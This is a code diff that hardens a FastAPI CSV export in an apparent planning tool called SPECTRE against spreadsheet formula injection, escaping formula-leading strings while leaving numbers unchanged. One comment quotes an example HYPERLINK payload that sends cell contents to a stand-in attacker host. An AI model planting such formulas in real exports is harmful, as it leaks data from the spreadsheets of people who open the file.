@@ -9,8 +9,9 @@ from __future__ import annotations
 import csv
 import io
 import logging
+import re
 from datetime import UTC, datetime
-from typing import Annotated
+from typing import Annotated, Any
 
 from fastapi import APIRouter, Depends, Query, Request
 from fastapi.responses import StreamingResponse
@@ -23,6 +24,45 @@ from spectre.web.planning_state import get_session_state
 logger = logging.getLogger(__name__)
 
 router = APIRouter(prefix="/plan")
+
+# Excel, LibreOffice Calc and Google Sheets evaluate a cell whose text begins
+# with one of these as a formula. The rows below carry operator- and UDL-supplied
+# strings (satellite names, segment names, notes, the operator's own username),
+# so a name of ``=HYPERLINK("http://attacker/"&A1,"ok")`` runs in the analyst's
+# spreadsheet on open. Nothing in SPECTRE executes it; the export is the carrier.
+_CSV_FORMULA_LEADS = ("=", "+", "-", "@", "\t", "\r")
+
+# A negative delta-v is written as "-123.456" and starts with a formula lead, so
+# a blanket escape would quote every retrograde burn in the file and break the
+# "importable into pandas without reshaping" promise in the docstring below.
+# A number is not a formula, so numbers are let through unchanged.
+_CSV_NUMERIC = re.compile(r"[-+]?\d+(\.\d+)?([eE][-+]?\d+)?")
+
+
+def _csv_safe(field: object) -> object:
+    """Return *field* in a form no spreadsheet will evaluate.
+
+    The leading apostrophe is the convention Excel, Calc and Sheets all honour:
+    the cell is forced to text and the apostrophe itself is not displayed. Only
+    strings that actually start with a formula lead are touched, so the numeric
+    columns and every ordinary name come through byte for byte.
+    """
+    if not isinstance(field, str) or not field.startswith(_CSV_FORMULA_LEADS):
+        return field
+    if _CSV_NUMERIC.fullmatch(field):
+        return field
+    return "'" + field
+
+
+def _write_row(writer: Any, row: list[object]) -> None:
+    """Write *row* with every field neutralised.
+
+    Every row in this module goes through here rather than calling writerow
+    directly, and a unit test walks this file's AST to keep it that way: an
+    export added later must not be able to reintroduce the injection by
+    reaching for csv.writer's own method.
+    """
+    writer.writerow([_csv_safe(field) for field in row])
 
 
 @router.get("/export", response_model=None)
@@ -57,11 +97,11 @@ async def export_intercepts(
 
     # Metadata header (# comments are ignored by most parsers, readable as-is)
     now_utc = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
-    writer.writerow([f"# SPECTRE Intercept Export — {now_utc} — Operator: {current_user.username}"])
-    writer.writerow([f"# Runs: {len(results)}  Filter: {run_id or 'all'}"])
-    writer.writerow([])
+    _write_row(writer, [f"# SPECTRE Intercept Export — {now_utc} — Operator: {current_user.username}"])
+    _write_row(writer, [f"# Runs: {len(results)}  Filter: {run_id or 'all'}"])
+    _write_row(writer, [])
 
-    writer.writerow([
+    _write_row(writer, [
         "run_id",
         "method",
         "red_name",
@@ -93,7 +133,7 @@ async def export_intercepts(
         ]
         if r.burns:
             for b in r.burns:
-                writer.writerow([
+                _write_row(writer, [
                     *common,
                     b.burn_number,
                     b.segment_name,
@@ -105,7 +145,7 @@ async def export_intercepts(
                     r.notes,
                 ])
         else:
-            writer.writerow([*common, "", "", "", "", "", "", "", r.notes])
+            _write_row(writer, [*common, "", "", "", "", "", "", "", r.notes])
 
     timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
     filename = (
